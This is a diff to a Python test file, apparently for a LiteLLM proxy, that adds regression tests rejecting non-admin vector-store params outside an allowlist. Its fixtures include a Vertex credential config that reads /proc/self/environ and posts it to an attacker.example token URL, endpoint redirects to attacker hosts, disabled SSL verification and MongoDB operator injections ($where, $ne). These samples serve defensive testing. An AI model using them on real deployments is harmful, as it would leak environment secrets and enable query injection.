@@ -2258,13 +2258,6 @@ async def test_new_vector_store_rejects_endpoint_params_from_non_admins(litellm_
 
 
 @pytest.mark.asyncio
-async def test_new_vector_store_lets_a_non_admin_use_provider_default_endpoints():
-    mock_prisma_client = await _create_store(
-        LitellmUserRoles.INTERNAL_USER,
-        litellm_params={"api_key": "sk-mine", "litellm_embedding_config": {"model": "text-embedding-3-small"}},
-    )
-
-    mock_prisma_client.db.litellm_managedvectorstorestable.create.assert_awaited_once()
 
 
 @pytest.mark.asyncio
@@ -2276,6 +2269,124 @@ async def test_new_vector_store_lets_a_proxy_admin_set_endpoints():
 
     created = mock_prisma_client.db.litellm_managedvectorstorestable.create.await_args.kwargs["data"]
     assert json.loads(created["litellm_params"])["api_base"] == "https://search.example"
+
+
+_VERTEX_WORKLOAD_IDENTITY_CREDENTIALS = {
+    "type": "external_account",
+    "audience": "x",
+    "subject_token_type": "urn:ietf:params:oauth:token-type:jwt",
+    "token_url": "https://attacker.example/token",
+    "credential_source": {"file": "/proc/self/environ"},
+}
+
+def _first_key(params: dict) -> str:
+    return next(iter(params))
+
+
+_KEYS_OUTSIDE_THE_NON_ADMIN_ALLOWLIST = [
+    {"vertex_credentials": _VERTEX_WORKLOAD_IDENTITY_CREDENTIALS},
+    {"vertex_ai_credentials": _VERTEX_WORKLOAD_IDENTITY_CREDENTIALS},
+    {"azure_ad_token": "eyJ-mine"},
+    {"aws_session_tags": {"team": "admin"}},
+    {"s3_endpoint_url": "https://attacker.example"},
+    {"sagemaker_base_url": "https://attacker.example"},
+    {"deployment_url": "https://attacker.example"},
+    {"aws_bedrock_project_id": "other-project"},
+    {"azure_scope": "https://attacker.example/.default"},
+    {"s3_bucket": "attacker-bucket"},
+    {"ssl_verify": False},
+    {"input_cost_per_query": 0},
+    {"vector_db_config": {"pinecone": {"index_name": "x"}}},
+    {"mongodb_filter_fields": [{"$where": "sleep(1000)"}]},
+    {"mongodb_collection": {"$ne": None}},
+]
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("litellm_params", _KEYS_OUTSIDE_THE_NON_ADMIN_ALLOWLIST, ids=_first_key)
+async def test_new_vector_store_rejects_params_outside_the_non_admin_allowlist(litellm_params):
+    """Regression: the write check was a denylist of endpoint keys, and each review found another key (a
+    vertex_credentials workload identity config makes google-auth read a local file and post it to token_url)
+    that let a non-admin decide where a store sends traffic or what signs it."""
+    with pytest.raises(HTTPException) as exc_info:
+        await _create_store(LitellmUserRoles.INTERNAL_USER, litellm_params=litellm_params)
+
+    assert exc_info.value.status_code == 403
+    assert next(iter(litellm_params)) in exc_info.value.detail
+
+
+_MONGODB_DATA_SHAPE_PARAMS = {
+    "litellm_embedding_model": "text-embedding-3-small",
+    "mongodb_database": "knowledge",
+    "mongodb_collection": "handbook",
+    "mongodb_text_field": "body",
+    "mongodb_embedding_field": "vector",
+    "mongodb_num_candidates": 200,
+    "mongodb_dimensions": 1536,
+    "mongodb_similarity": "cosine",
+    "mongodb_filter_fields": ["team", "year"],
+    "mongodb_text_index": "handbook_text",
+    "mongodb_hybrid_search": True,
+    "mongodb_hybrid_weights": {"vector": 0.7, "text": 0.3},
+    "mongodb_exact_search": False,
+    "mongodb_score_threshold": 0.5,
+    "custom_metadata": {"owner": {"team": "docs"}},
+}
+
+
+@pytest.mark.asyncio
+async def test_new_vector_store_lets_a_non_admin_save_mongodb_data_shape_params_on_the_deployment_sidecar(
+    monkeypatch,
+):
+    from litellm.llms.mongodb.vector_stores.transformation import MongoDBVectorStoreConfig
+    from litellm.proxy.vector_store_endpoints.endpoints import build_request_data_from_managed_vector_store
+    from litellm.types.router import GenericLiteLLMParams
+    from litellm.types.vector_stores import LiteLLM_ManagedVectorStore
+
+    monkeypatch.setenv("MONGODB_SIDECAR_API_BASE", "https://deployment-sidecar.example")
+    monkeypatch.setenv("MONGODB_SIDECAR_API_KEY", "sidecar-key")
+
+    mock_prisma_client = await _create_store(
+        LitellmUserRoles.INTERNAL_USER, custom_llm_provider="mongodb", litellm_params=_MONGODB_DATA_SHAPE_PARAMS
+    )
+
+    persisted = json.loads(
+        mock_prisma_client.db.litellm_managedvectorstorestable.create.await_args.kwargs["data"]["litellm_params"]
+    )
+    assert {key: persisted.get(key) for key in _MONGODB_DATA_SHAPE_PARAMS} == _MONGODB_DATA_SHAPE_PARAMS
+    search_params = build_request_data_from_managed_vector_store(
+        LiteLLM_ManagedVectorStore(vector_store_id="vs-new", custom_llm_provider="mongodb", litellm_params=persisted)
+    )
+    config = MongoDBVectorStoreConfig()
+    assert (
+        config.get_complete_url(api_base=search_params.get("api_base"), litellm_params=search_params)
+        == "https://deployment-sidecar.example"
+    )
+    headers = config.validate_environment(
+        headers={}, litellm_params=GenericLiteLLMParams.model_validate(dict(search_params))
+    )
+    assert headers["Authorization"] == "Bearer sidecar-key"
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize(
+    "litellm_params",
+    [
+        {"vertex_credentials": _VERTEX_WORKLOAD_IDENTITY_CREDENTIALS, "vertex_project": "p"},
+        {
+            "api_base": "http://127.0.0.1:8080",
+            "api_key": "os.environ/MONGODB_SIDECAR_API_KEY",
+            "mongodb_database": "kb",
+        },
+    ],
+    ids=["vertex-credentials", "company-handbook-sidecar"],
+)
+async def test_new_vector_store_lets_a_proxy_admin_save_any_params(litellm_params):
+    mock_prisma_client = await _create_store(LitellmUserRoles.PROXY_ADMIN, litellm_params=litellm_params)
+
+    created = mock_prisma_client.db.litellm_managedvectorstorestable.create.await_args.kwargs["data"]
+    persisted = json.loads(created["litellm_params"])
+    assert {key: persisted.get(key) for key in litellm_params} == litellm_params
 
 
 @pytest.mark.asyncio
@@ -2302,7 +2413,7 @@ async def test_new_vector_store_rejects_a_non_admin_reusing_a_config_store_id():
         await _create_store(
             LitellmUserRoles.INTERNAL_USER,
             registry=_registry_with_config_store(),
-            litellm_params={"api_key": "sk-mine"},
+            litellm_params={"mongodb_collection": "docs"},
         )
 
     assert exc_info.value.status_code == 403
@@ -3599,25 +3710,64 @@ class TestUpdateVectorStoreAccessControlAndRedaction:
 
     @pytest.mark.asyncio
     @pytest.mark.parametrize(
-        "saved,litellm_params",
+        "saved,litellm_params,named_key",
         [
-            ({}, {"litellm_credential_name": "prod"}),
-            ({"litellm_credential_name": "team"}, {"litellm_credential_name": "prod"}),
+            ({}, {"litellm_credential_name": "prod"}, "litellm_credential_name"),
+            ({"litellm_credential_name": "team"}, {"litellm_credential_name": "prod"}, "litellm_credential_name"),
             (
                 {},
                 {"litellm_embedding_config": {"litellm_credential_name": "prod", "api_base": "https://a.example"}},
+                "litellm_embedding_config",
             ),
         ],
         ids=["set", "change", "nested"],
     )
-    async def test_non_admin_update_cannot_set_a_credential_name(self, saved, litellm_params):
+    async def test_non_admin_update_cannot_set_a_credential_name(self, saved, litellm_params, named_key):
         """Regression: a store's litellm_credential_name merges that proxy credential's secrets into every
         search, so naming one next to your own api_base sent the credential to your host."""
         with pytest.raises(HTTPException) as exc_info:
             await self._update_as(LitellmUserRoles.INTERNAL_USER, saved, {"litellm_params": litellm_params})
 
         assert exc_info.value.status_code == 403
-        assert "litellm_credential_name" in exc_info.value.detail
+        assert named_key in exc_info.value.detail
+
+    @pytest.mark.asyncio
+    @pytest.mark.parametrize("litellm_params", _KEYS_OUTSIDE_THE_NON_ADMIN_ALLOWLIST, ids=_first_key)
+    async def test_non_admin_update_cannot_set_params_outside_the_allowlist(self, litellm_params):
+        with pytest.raises(HTTPException) as exc_info:
+            await self._update_as(
+                LitellmUserRoles.INTERNAL_USER, {"mongodb_database": "kb"}, {"litellm_params": litellm_params}
+            )
+
+        assert exc_info.value.status_code == 403
+        assert next(iter(litellm_params)) in exc_info.value.detail
+
+    @pytest.mark.asyncio
+    async def test_non_admin_update_can_repoint_a_company_handbook_store_at_new_data(self):
+        saved = {
+            "api_base": "http://127.0.0.1:8080",
+            "api_key": "os.environ/MONGODB_SIDECAR_API_KEY",
+            "mongodb_database": "knowledge",
+            "mongodb_collection": "company_handbook",
+            "litellm_embedding_model": "text-embedding-3-small",
+        }
+        mock_prisma_client = await self._update_as(
+            LitellmUserRoles.INTERNAL_USER,
+            saved,
+            {
+                "litellm_params": {
+                    "api_key": "REDACTED_BY_LITELM",
+                    "mongodb_collection": "company_handbook_v2",
+                    "litellm_embedding_model": "text-embedding-3-large",
+                }
+            },
+        )
+
+        assert self._persisted_litellm_params(mock_prisma_client, *saved) == {
+            **saved,
+            "mongodb_collection": "company_handbook_v2",
+            "litellm_embedding_model": "text-embedding-3-large",
+        }
 
     @pytest.mark.asyncio
     async def test_admin_update_can_set_a_credential_name(self):
